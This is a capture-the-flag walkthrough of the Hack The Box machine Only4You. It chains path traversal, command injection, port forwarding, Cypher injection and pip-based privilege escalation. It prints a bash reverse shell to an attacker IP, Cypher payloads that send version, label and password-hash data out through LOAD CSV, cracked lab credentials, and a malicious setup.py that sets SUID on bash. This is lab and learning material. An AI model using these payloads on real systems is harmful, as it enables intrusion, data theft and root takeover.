---
title: HTB - Only4You
author: nirajkharel
date: 2023-08-27 14:10:00 +0800
categories: [HackTheBox]
tags: [HTB, HackTheBox]
render_with_liquid: false
---


HTB — Only4You
================

A detailed walkthrough for solving Only4You on HTB. The box contains vulnerability like File Inclusion, Weak Credentials, Cypher Injection, Command Injection and privilege escalation through sudo.

![](https://cdn-images-1.medium.com/max/2000/1*RS3Mr5rozUXZdqs44xPtwg.png)

## Enumeration

### NMAP

Let’s start with an NMAP Scanning to enumerate open ports and the services running on the IP.

```bash
nmap -sC -sV -oA nmap/10.10.11.210 10.10.11.210 -vv

22/tcp    open  ssh               syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e8:83:e0:a9:fd:43:df:38:19:8a:aa:35:43:84:11:ec (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDX7r34pmJ6U9KrHg0/WDdrofcOXqTr13Iix+3D5ChuYwY2fmqIBlfuDo0Cz0xLnb/jaT3ODuDtmAih6unQluWw3RAf03l/tHxXfvXlWBE3I7uDu+roHQM7+hyShn+559JweJlofiYKHjaErMp33DI22BjviMrCGabALgWALCwjqaV7Dt6ogSllj+09trFFwr2xzzrqhQVMdUdljle99R41Hzle7QTl4maonlUAdd2Ok41ACIu/N2G/iE61snOmAzYXGE8X6/7eqynhkC4AaWgV8h0CwLeCCMj4giBgOo6EvyJCBgoMp/wH/90U477WiJQZrjO9vgrh2/cjLDDowpKJDrDIcDWdh0aE42JVAWuu7IDrv0oKBLGlyznE1eZsX2u1FH8EGYXkl58GrmFbyIT83HsXjF1+rapAUtG0Zi9JskF/DPy5+1HDWJShfwhLsfqMuuyEdotL4Vzw8ZWCIQ4TVXMUwFfVkvf410tIFYEUaVk5f9pVVfYvQsCULQb+/uc=
|   256 83:f2:35:22:9b:03:86:0c:16:cf:b3:fa:9f:5a:cd:08 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAz/tMC3s/5jKIZRgBD078k7/6DY8NBXEE8ytGQd9DjIIvZdSpwyOzeLABxydMR79kDrMyX+vTP0VY5132jMo5w=
|   256 44:5f:7a:a3:77:69:0a:77:78:9b:04:e0:9f:11:db:80 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOqatISwZi/EOVbwqfFbhx22EEv6f+8YgmQFknTvg0wr
80/tcp    open  http              syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://only4you.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
10000/tcp open  snet-sensor-mgmt? syn-ack
```

Three ports **22, 80** and **1000** are open which are for **SSH** and **HTTP** and **snet-sensor-mgmt**. Add only4you.htb on /etc/hosts file as shown below.

```bash
cat /etc/hosts                                 
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
10.10.11.210    only4you.htb
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others
```

Viewing the application, almost all the hyperlinks and directing towards the home page and no interesting functionalities are identified.

![](https://cdn-images-1.medium.com/max/3314/1*isnrFlmrK9Z9omlE9UqjkA.png)

### Directory Enumeration

**Feroxbuster**

    feroxbuster -u http://only4you.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
    
    200      GET        9l       23w      847c http://only4you.htb/static/img/favicon.png
    200      GET       90l      527w    40608c http://only4you.htb/static/img/testimonials/testimonials-5.jpg
    200      GET       96l      598w    48920c http://only4you.htb/static/img/team/team-4.jpg
    200      GET      159l      946w    71778c http://only4you.htb/static/img/team/team-1.jpg
    200      GET        1l      625w    55880c http://only4you.htb/static/vendor/glightbox/js/glightbox.min.js
    200      GET        7l       27w     3309c http://only4you.htb/static/img/apple-touch-icon.png
    200      GET      274l      604w     6492c http://only4you.htb/static/js/main.js
    200      GET        9l      155w     5417c http://only4you.htb/static/vendor/purecounter/purecounter_vanilla.js
    200      GET        1l      233w    13749c http://only4you.htb/static/vendor/glightbox/css/glightbox.min.css
    200      GET        1l      313w    14690c http://only4you.htb/static/vendor/aos/aos.js
    200      GET       71l      380w    30729c http://only4you.htb/static/img/testimonials/testimonials-3.jpg
    200      GET       13l      171w    16466c http://only4you.htb/static/vendor/swiper/swiper-bundle.min.css
    200      GET       88l      408w    36465c http://only4you.htb/static/img/testimonials/testimonials-4.jpg
    200      GET        1l      218w    26053c http://only4you.htb/static/vendor/aos/aos.css
    200      GET       12l      557w    35445c http://only4you.htb/static/vendor/isotope-layout/isotope.pkgd.min.js
    200      GET      112l      805w    65527c http://only4you.htb/static/img/team/team-3.jpg
    200      GET     1936l     3839w    34056c http://only4you.htb/static/css/style.css
    200      GET      160l      818w    71959c http://only4you.htb/static/img/testimonials/testimonials-1.jpg
    200      GET      172l     1093w    87221c http://only4you.htb/static/img/team/team-2.jpg
    200      GET      244l     1332w   103224c http://only4you.htb/static/img/testimonials/testimonials-2.jpg
    200      GET       14l     1683w   143281c http://only4you.htb/static/vendor/swiper/swiper-bundle.min.js
    200      GET        1l      133w    66571c http://only4you.htb/static/vendor/boxicons/css/boxicons.min.css
    200      GET        7l     2208w   195498c http://only4you.htb/static/vendor/bootstrap/css/bootstrap.min.css
    200      GET        7l     1225w    80457c http://only4you.htb/static/vendor/bootstrap/js/bootstrap.bundle.min.js
    200      GET     1876l     9310w    88585c http://only4you.htb/static/vendor/bootstrap-icons/bootstrap-icons.css
    200      GET        0l        0w   110438c http://only4you.htb/static/vendor/remixicon/remixicon.css
    200      GET      673l     2150w    34125c http://only4you.htb/
    [####################] - 3m     30050/30050   0s      found:27      errors:0      
    [####################] - 3m     30000/30000   157/s   http://only4you.htb/ 

### Dirsearch

    python3 dirsearch.py -u http://only4you.htb/
    
      _|. _ _  _  _  _ _|_    v0.4.3
     (_||| _) (/_(_|| (_| )
    
    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11710
    
    Output: /home/niraj/arsenal/web/dirsearch/reports/http_only4you.htb/__23-05-28_15-14-30.txt
    
    Target: http://only4you.htb/
    
    [15:14:30] Starting: 
    
    Task Completed

No interesting directories were discovered on the application. Let’s navigate towards the subdomains.

### Subdomain Enumeration

**FFuF**

    ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://only4you.htb -H 'Host: FUZZ.only4you.htb' -fw 6
    
            /'___\  /'___\           /'___\       
           /\ \__/ /\ \__/  __  __  /\ \__/       
           \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
            \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
             \ \_\   \ \_\  \ \____/  \ \_\       
              \/_/    \/_/   \/___/    \/_/       
    
           v1.5.0-dev
    ________________________________________________
    
     :: Method           : GET
     :: URL              : http://only4you.htb
     :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
     :: Header           : Host: FUZZ.only4you.htb
     :: Follow redirects : false
     :: Calibration      : false
     :: Timeout          : 10
     :: Threads          : 40
     :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
     :: Filter           : Response words: 6
    ________________________________________________
    
    beta                    [Status: 200, Size: 2191, Words: 370, Lines: 52, Duration: 273ms]
    :: Progress: [19966/19966] :: Job [1/1] :: 58 req/sec :: Duration: [0:02:28] :: Errors: 0 ::

Performing the subdomain enumeration through FFuF, we can find a new subdomain called beta. Let’s add this subdomain in our /etc/hosts file again.

    cat /etc/hosts 
    # Host addresses
    127.0.0.1  localhost
    127.0.1.1  parrot
    10.10.11.210    only4you.htb beta.only4you.htb
    ::1        localhost ip6-localhost ip6-loopback
    ff02::1    ip6-allnodes
    ff02::2    ip6-allrouters
    # Others

Navigating the subdomain, we can see this application contains some interesting functionalities like resize, convert and it also have the link from where we can download the source code of the application.

![](https://cdn-images-1.medium.com/max/2556/1*CU6d3GavbXutjmLb_5ttYw.png)

Navigated to the image resizer and tried to upload the arbitrary files without any success.

![](https://cdn-images-1.medium.com/max/3178/1*5m5henpdcV8n0QdONuBhBw.png)

Navigated to the image converter and tried to upload the arbitrary files without any success as well.

![](https://cdn-images-1.medium.com/max/2756/1*trw362J-n4LOzZgymbIamQ.png)

Let’s download the source code of the application and perform source code analysis.

![](https://cdn-images-1.medium.com/max/2820/1*H4Fcgk4_k8iaBcamW8TzWg.png)

In the meantime, I also perform nuclei scanning to identify if the application contains any defined vulnerabilities.

    nuclei -u http://only4you.htb  
    
                         __     _
       ____  __  _______/ /__  (_)
      / __ \/ / / / ___/ / _ \/ /
     / / / / /_/ / /__/ /  __/ /
    /_/ /_/\__,_/\___/_/\___/_/   v2.9.4
    
                    projectdiscovery.io
    
    [INF] Current nuclei version: v2.9.4 (latest)
    [INF] Current nuclei-templates version: 9.5.0 (latest)
    [INF] New templates added in latest release: 62
    [INF] Templates loaded for current scan: 6000
    [INF] Targets loaded for current scan: 1
    [INF] Templates clustered: 1059 (Reduced 1000 Requests)
    [nginx-version] [http] [info] http://only4you.htb [nginx/1.18.0]
    [tech-detect:lightbox] [http] [info] http://only4you.htb
    [tech-detect:bootstrap] [http] [info] http://only4you.htb
    [tech-detect:google-font-api] [http] [info] http://only4you.htb
    [tech-detect:nginx] [http] [info] http://only4you.htb
    [fingerprinthub-web-fingerprints:openfire] [http] [info] http://only4you.htb
    [INF] Using Interactsh Server: oast.live
    [options-method] [http] [info] http://only4you.htb [HEAD, GET, OPTIONS, POST]
    [http-missing-security-headers:access-control-allow-credentials] [http] [info] http://only4you.htb
    [http-missing-security-headers:access-control-expose-headers] [http] [info] http://only4you.htb
    [http-missing-security-headers:access-control-allow-methods] [http] [info] http://only4you.htb
    [http-missing-security-headers:x-frame-options] [http] [info] http://only4you.htb
    [http-missing-security-headers:clear-site-data] [http] [info] http://only4you.htb
    [http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://only4you.htb
    [http-missing-security-headers:strict-transport-security] [http] [info] http://only4you.htb
    [http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://only4you.htb
    [http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://only4you.htb
    [http-missing-security-headers:content-security-policy] [http] [info] http://only4you.htb
    [http-missing-security-headers:x-content-type-options] [http] [info] http://only4you.htb
    [http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://only4you.htb
    [http-missing-security-headers:access-control-max-age] [http] [info] http://only4you.htb
    [http-missing-security-headers:access-control-allow-headers] [http] [info] http://only4you.htb
    [http-missing-security-headers:permissions-policy] [http] [info] http://only4you.htb
    [http-missing-security-headers:referrer-policy] [http] [info] http://only4you.htb
    [http-missing-security-headers:access-control-allow-origin] [http] [info] http://only4you.htb
    [openssh-detect] [tcp] [info] only4you.htb:22 [SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5]
    [waf-detect:nginxgeneric] [http] [info] http://only4you.htb/

## Initial Access

The application contains the source code for image resize, image convert in the filename called **app.py** and viewing the code, it seems like the application is built on Flask. But the more interesting part of the code was for **download** where the code is taking image name as the argument and passes it on **posixpath.normpath()** function.

![](https://cdn-images-1.medium.com/max/2000/1*B7e0IkPa0iiK5fdBaEjvFA.png)

Performing some research on python posixpath, I found a Directory Traversal issues similar to it on the python issues section. You can navigate to below link for more details.
[Directory traversal with http.server and SimpleHTTPServer on windows · Issue #70844](https://github.com/python/cpython/issues/70844)

We can craft the request from the above code as the application takes **image** as the argument and performs **POST** request on the **/download** route. Let’s try if the image parameter contains some directory traversal issue.

![](https://cdn-images-1.medium.com/max/2000/1*jKH3dwpKfSNIvPmfQ8ogcw.png)

I was not able to view any arbitrary files from the directory traversal as talked above. If we see the above source code again, there is a verification check on the code before calling the posixpath method and it checks whether the application contains “**..”** on the file name and whether filename starts with “**../”**, this should be the reason for redirecting us into the **/list** page as shown on the response above.

Let’s explore the posixpath module locally.

![](https://cdn-images-1.medium.com/max/2000/1*YNYOD-y3Y18E7yp1CUKeCg.png)

As shown in the image above, when the input **“../../../../../../niraj.jpg”** is given to the function, Python does not backtrack along the traversed path. If we prepend a **“/”** to the mentioned payload, Python correctly performs directory traversals. However, due to the code filtering out **‘..’**, if we directly pass the root path, Python interprets it as the root path.

![](https://cdn-images-1.medium.com/max/2000/1*dIppdJn-mRMSUKTdt6OPqw.png)

Which means we do not need to perform backslash to perform the directory traversal, we can directly start the path with **/** and get the desired file as shown above.

![](https://cdn-images-1.medium.com/max/2000/1*Zjz4eqPlr2Y2xHcpMEQ44w.png)

Let’s use Burp intruder and Local File Linux payload option to enumerate other file systems in the box.

![](https://cdn-images-1.medium.com/max/2000/1*O6oYQn9ga1iPDImWh7xmPg.png)

We can see the nginx access.log file which contains every requests performed on the application.

![](https://cdn-images-1.medium.com/max/2000/1*YLdx_txSTMQOJlCyP-8SKA.png)

Since the application contains nginx as a server, we should find another nginx file called error.log file which contains any error occurred on the server.

![](https://cdn-images-1.medium.com/max/2000/1*xeKxkhH597am6ObXsfrlsw.png)

But there was empty response from the server when **error.log** file was accessed. We need to find alternate way in order to view the interesting files on the box.

We are aware of a single domain and its corresponding subdomain on the server, specifically named **only4you.htb** and **beta.only4you.htb**. We currently possess the source code for the beta version, so our primary objective is to obtain access to the main application’s source code, assuming that it may contain some interesting code snippets.

If we talk about the linux web server, the code files can typically be found within the **/var/www/** directory. In the case of a single application, the source code is usually located in the **/var/www/html/** directory. However, when multiple applications are hosted on the server, each application’s domain name is created as a subdirectory within the **/var/www/** directory, with the corresponding code stored within. For Example, the main application’s code would be located at **/var/www/only4you.htb/**, while the beta application’s code would reside at **/var/www/beta.only4you.htb/**.

By examining the source code of the beta version, we have discovered the presence of an **app.py** file within it. It is possible that the main application also includes an **app.py** file if it has been developed using Flask. Let’s verify.

![](https://cdn-images-1.medium.com/max/2000/1*ZyX9XeY9jk4u0fn6BtzKTA.png)

We can view the content of **/var/www/only4you.htb/app.py** file as shown above. Let’s try to enumerate the other python files on the server using Burp’s intruder. Initially, I employ use Intruder for fuzzing to simplify the process. If this approach doesn’t produce any results, we can combine SecLists with FFuF or Wfuzz for further exploration.

![](https://cdn-images-1.medium.com/max/2000/1*AKZilYeiv5siW--igVwRPQ.png)

You can try different payloads provided by Burp. For this one, Directory Short was successful.

![](https://cdn-images-1.medium.com/max/2000/1*pFEub85ivZDymycJW3DJ5w.png)

As seen in the image above, we can see one additional file called form.py file which was not located on the beta version of the application.

![](https://cdn-images-1.medium.com/max/2000/1*im-uITGiY2_GUkt60IrBOw.png)

Let’s download the file and analyze it locally.

![](https://cdn-images-1.medium.com/max/2000/1*JECuSGLCEKxxNm6gbwJxwA.png)

The code above uses a Python module **“run”** to check if a domain name is valid when an email address is entered. It does this by running a system command using the “dig” tool and adding the user’s input as the domain to be checked. However, this approach could be vulnerable because it opens the possibility for someone to inject malicious commands.

Let’s navigate to the application where a email address is supplied.

![](https://cdn-images-1.medium.com/max/3052/1*N9RVI6yNGoPtMnjckcNZig.png)

Enter the details and intercept the request.

![](https://cdn-images-1.medium.com/max/2000/1*oQx-WtnpFBG1bMu2iMIx4w.png)

Perform a basic curl command into our attacker machine. As shown on the image above ‘;’ is used to inject the bash commands.

![](https://cdn-images-1.medium.com/max/2000/1*7UsA0DKq6hJtEb0mh31R_A.png)

Since we get hit into our server, we can confirm that there is a command injection vulnerability.

Let’s create a reverse shell payload. The payload above saves the reverse shell code into a bash file and then executes the file. This approach was taken for the reverse shell because a generic reverse shell payload was not working on the box.

    echo '/bin/bash -i >& /dev/tcp/10.10.14.112/1337 0>&1' > reverse.sh;bash reverse.sh

Setup a netcat listener and we can get the reverse shell as shown below.

![](https://cdn-images-1.medium.com/max/2000/1*1tFpEgGraZ6hO80pwAUVNw.png)

After obtaining the shell as the “**www-data**” user, our next objective is to elevate our privileges and gain access as another user on the system. Tried various techniques for privilege escalation on Linux, but unfortunately, none of them were successful.

I searched for the open ports and services on the box and found some interesting ports like **8001,3000,7687** and **7474** which are not exposed on the network and are only accessible through the localhost. Port 8001 and 3000 are general ports which are mainly used for web application and ports 7687 and 7474 are related to Neo4j.

Neo4j is a type of database called a graph database. Unlike traditional databases with rows and columns, a graph database organizes data using nodes, edges, and properties. If you have performed the AD pentesting and used BloodHound, you should have already be familiar with Neo4j.

![](https://cdn-images-1.medium.com/max/2000/1*NB2s1maxUIFfl-ThHQiAqA.png)

Since the port is only accessible through localhost, we should forward the port using chisel and access the port through attacker machine.

![](https://cdn-images-1.medium.com/max/2000/1*Q_mc5YV37qRxW7jQyRJCBg.png)

As discussed, port 7474 contains Neo4j installed. It has a default credentials as neo4j as username and neo4j as password.

![](https://cdn-images-1.medium.com/max/3116/1*e1AZ1fG6kQ0JkO_N_AlAjg.png)

Let’s explore another ports as well. Using chisel, we can forward multiple ports at time.

Setup a chisel server at your attacker machine.

    sudo ./chisel server --reverse --port 8081

Forward all the mentioned port from the box using chisel client.

    ./chisel_1.6 client 10.10.14.112:8081 R:7474:10.10.11.210:7474 R:7687:10.10.11.210:7687 R:3000:10.10.11.210:3000 R:8001:10.10.11.210:8001

![](https://cdn-images-1.medium.com/max/2000/1*R1vxiKqa-LBVrPnnQCjlcA.png)

On port 3000, we can find Gogs installed which is [self-hosted Git service](https://gogs.io/). When trying to login with default credentials, I was not successful.

![](https://cdn-images-1.medium.com/max/3194/1*XVCGAK7Sa8VNzin3-gqTPg.png)

On port 8001, we can find some custom web application called Only4you, which seems like an internal application used by internal employee. Trying some default credentials, I was able to login into the application with **admin:admin**.

![](https://cdn-images-1.medium.com/max/3232/1*jhIod4uAILQ81Fkd63WEEg.png)

![](https://cdn-images-1.medium.com/max/3226/1*TqpzeQrk4vqjvgUvzkiMGg.png)

Navigating into the Employee section we can find the search box where a user can perform some search query on it.

![](https://cdn-images-1.medium.com/max/3446/1*BnT8Welqti_WWYi8v1o-SA.png)

Since there is a Neo4j database which can contains the employee information. As we refer to the Neo4j database while performing the AD pentesting, it contains bunch of information about groups, computer and users on it. There is a possible chance that the above application is using Neo4j database as a backend. To be honest, this is where the [Official HTB Discussion](https://forum.hackthebox.com/t/official-onlyforyou-discussion/279247/19) about the box came handy.

I searched for port 7687 vulnerabilities and discovered three common vulnerabilities associated with Neo4j. These vulnerabilities include Default Credentials, Common Directories & Files in the Local System, and Cypher Injection. While we have already identified and addressed the issue of default credentials, I did not come across any instances of common directories and files in the local system. Therefore, it is likely that our focus should now shift towards exploring the possibility of Cypher Injection as the remaining area of concern.

Reference for Neo4j Pentesting.
[**Neo4j Pentesting: Exploit Notes**](https://exploit-notes.hdks.org/exploit/database/neo4j-pentesting/)

**Cypher Injection**

Cypher is Neo4j’s graph query language that lets you retrieve data from the graph and;

Cypher Injection refers to a technique where maliciously crafted input can break out of its intended context. By manipulating the query itself, an attacker can seize control of the query and execute unexpected operations on the database, potentially leading to unauthorized actions or data compromise in Neo4j database. It is somehow familiar with SQL Injection but the technologies are entirely different.

Please refer to below reference for understanding how cypher injection works.
[Cypher Injection (neo4j)](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j)

I am simply copying and pasting the payloads from the same reference since this topic was very new for me as well and I did not intended to learn more about this ;)

**Enumerate version**

    ' OR 1=1 WITH  1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.112/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // 

We should setup a simple HTTP server in our local machine and the query will transfer the data into our server.

![](https://cdn-images-1.medium.com/max/2968/1*oEaGXk1rfWRiDVYBLqxL-Q.png)

**Enumerate Labels**

    ' OR 1=1 WITH 1 as a  CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.112/?l='+label as l RETURN 0 as _0 //

![](https://cdn-images-1.medium.com/max/2000/1*1vKbbeNypXcoQJ-88oyOXw.png)

**Enumerate the property of key.**

    ' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.112:80/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //

![](https://cdn-images-1.medium.com/max/3030/1*0-k8rourtsWf3tHTbRpi7A.png)

We have identified two hashes for user admin and john.

    admin: 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
    john: a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6

Let’s try to find the plain text of the hash above from Crackstation.

Password for the user **admin** is **admin**.

![](https://cdn-images-1.medium.com/max/2062/1*k9JMvVxC5JLo20XWh04MfQ.png)

    admin:admin

Password for the user **john** is **ThisIs4You**.

![](https://cdn-images-1.medium.com/max/2254/1*8blgAudm0-JWbt2g2q7XTg.png)

    john:ThisIs4You

![](https://cdn-images-1.medium.com/max/2000/1*2C3TCzXt9gVG1_W_OIYioA.png)

I could have tried brute forcing the SSH service after getting the username from /etc/passwd file ;).

Let’s perform SSH into the machine using the above credentials.

    ssh john@only4you.htb
    # Password: ThisIs4You

We have successfully logged in into the machine as **john** user.

![](https://cdn-images-1.medium.com/max/2000/1*C3kcA60KC43MnlB6oD5dxQ.png)

View the user.txt file.

![](https://cdn-images-1.medium.com/max/2000/1*egC68RuqirqLbmhwzt2eSQ.png)

## Privilege Escalation

We can see that john is privileged to run the mentioned command as sudo and no password is required.

![](https://cdn-images-1.medium.com/max/2000/1*ojJ60xKxsAlWo3kVDfGg6w.png)

If we look into the command above carefully, we can see the wildcard after the host:port on the pip3 download command. Pip is a package management system written in Python. It can download custom Python package so we can create a malicious package to execute arbitrary code. Since the pip command is set to be run with root privilege without password and the wildcard entry is provided on the command, there is a possible chance that we could execute arbitrary python commands and can escalate the privileges.”

When the pip3 command is used to download the packages, the arbitrary code that we will specify on the setup.py file will be executed with root privileges.

For more explanation, follow the below reference.
[Pip Download Code Execution: Exploit Notes](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/pip-download-code-execution/)

**Create a Python Package.**

![](https://cdn-images-1.medium.com/max/2000/1*sAgM7FmfkXxkBi42H1Zl7A.png)

Create a setup.py file which executes the system commands and assigns the SUID permission into **/bin/bash** file.

    # setup.py
    from setuptools import setup, find_packages
    from setuptools.command.install import install
    from setuptools.command.egg_info import egg_info
    
    def RunCommand():
     # Arbitrary code here!
     import os;os.system("chmod u+s /usr/bin/bash")
    
    class RunEggInfoCommand(egg_info):
        def run(self):
            RunCommand()
            egg_info.run(self)
    
    
    class RunInstallCommand(install):
        def run(self):
            RunCommand()
            install.run(self)
    
    setup(
        name = "exploitpy",
        version = "0.0.1",
        license = "MIT",
        packages=find_packages(),
        cmdclass={
            'install' : RunInstallCommand,
            'egg_info': RunEggInfoCommand
        },
    )

The files under the package would be as follow.

    john@only4you:~$ ls -R exploitpy/
    exploitpy/:
    setup.py  src
    
    exploitpy/src:
    __init__.py  main.py

Run **sudo python3 -m build** command to package the project.

![](https://cdn-images-1.medium.com/max/2000/1*8i1yKtG14KGxTP8eAbbmfg.png)

We can see the .tar.gz file has been created inside the dist directory.

![](https://cdn-images-1.medium.com/max/2000/1*mZPRjgksWgcQJlsGz32l6w.png)

Tried using ‘ — index-url’ with pip to download from alternate source and hosting the tar.gz file on an attacker machine but the pip3 download command was looking for the file on 3000 port.

![](https://cdn-images-1.medium.com/max/2000/1*D_aiJZglsC6hSJRC_IzDCw.png)

We need to find the directory where the port 3000 is hosted and that directory needs to be writable.

Let’s explore the application again which is hosted on the port 3000 and see there if we can save the file through the application.

Use the same proxy configured from chisel above and navigate to port 3000.

On attacker machine,

    /chisel server --reverse --port 8081

On the box,

    ./chisel client 10.10.14.112:8081 R:3000:127.0.0.1:3000

You will need to download the chisel on the box. There are alternate way to forward the port through SSH since we have SSH on the box. It’s up to you to explore that part.

![](https://cdn-images-1.medium.com/max/2000/1*-tKmZ9i3gHZYUQAWpDsAEA.png)

Open the application on our local machine.

![](https://cdn-images-1.medium.com/max/3088/1*A16jcRnsgwisF62LgWAsUQ.png)

There is some kind of repositories section on the Explore tab, there is a chance that we could upload the files here.

![](https://cdn-images-1.medium.com/max/3086/1*akDLaunQAx7bvYPaBgR--Q.png)

Before that, we need to login into the application where there are two users administrator and john and we have the credential for john. **“john:ThisIs4You”**

![](https://cdn-images-1.medium.com/max/3136/1*xdCFexPpm4B1YnGDw_BfGQ.png)

Login into the application using john credential.

![](https://cdn-images-1.medium.com/max/2788/1*yR7SJ8EvIKFv_OHiYXa7DQ.png)

We can see a new + button on the panel.

![](https://cdn-images-1.medium.com/max/3066/1*BllTtKEuAVN0q_V-FCmQdA.png)

Click on create new repository.

Enter a new name for repository, click on Initialize this repository and proceed further.

![](https://cdn-images-1.medium.com/max/3206/1*isPJ45xmNRLjXHpUak4EkA.png)

Here we can see our repository has been created. Since our goal is to save the tar.gz file into the server. We need to upload that file into this repository.

![](https://cdn-images-1.medium.com/max/3238/1*A7Hc5UX6ROP4213wbtogmQ.png)

Upload the file.

![](https://cdn-images-1.medium.com/max/3136/1*XyMTDISV5dUzhpwsO_0mbQ.png)

Proceed further for commit.

![](https://cdn-images-1.medium.com/max/3052/1*3U5amS3c92a8z3xQOte4eA.png)

We can see our tar.gz file on the application which means it has successfully been uploaded in the server.

![](https://cdn-images-1.medium.com/max/3326/1*aYLVoh0bYN0V7Z5xjhAeCQ.png)

Navigate to the file and hover over View Raw section from where we will get the full path of the uploaded file.

![](https://cdn-images-1.medium.com/max/3234/1*C6k_bcju6mA-BMow6nX0mg.png)

Copy the Raw link which is;

    http://0.0.0.0:3000/john/niraj/raw/master/exploitpy-0.0.1.tar.gz

Which makes our payload as;

    sudo /usr/bin/pip3 download http\://127.0.0.1\:3000/john/niraj/raw/master/exploitpy-0.0.1.tar.gz

Run the above command and we will assign the SUID on /bin/bash file.

![](https://cdn-images-1.medium.com/max/2000/1*Qbq9XPrO7KD1yPnPV5F8Kw.png)

Here you go ! Happy Hacking !!!
